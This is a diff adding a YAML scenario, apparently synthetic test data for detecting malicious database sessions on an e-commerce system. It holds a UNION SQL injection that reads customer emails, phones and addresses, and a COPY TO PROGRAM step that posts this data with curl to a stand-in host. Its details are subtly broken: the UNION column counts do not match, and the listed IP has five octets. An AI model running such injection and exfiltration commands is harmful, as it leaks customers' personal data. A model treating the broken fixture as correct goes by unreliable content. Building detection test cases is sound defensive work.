@@ -1,0 +1,24 @@
+scenario_id: gen_ecommerce_10_sql_injection_mal_242
+family_id: gen_ecommerce_10_sql_injection_mal_fam242
+domain: ecommerce
+time_of_day: 04:50
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: inject
+  role: analytics_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 8.0
+  events:
+  - step_id: probe
+    sql: SELECT order_id, status FROM orders WHERE order_id = 0 UNION SELECT email,
+      phone, shipping_address FROM customers
+  - step_id: exfil
+    sql: COPY (SELECT email, phone, shipping_address FROM customers) TO PROGRAM 'curl
+      -sX POST https://analytics-mirror.datasink.example/ingest -d @-'
+    connects_to:
+      ip: 185.220.101.238.248
+      port: 8443
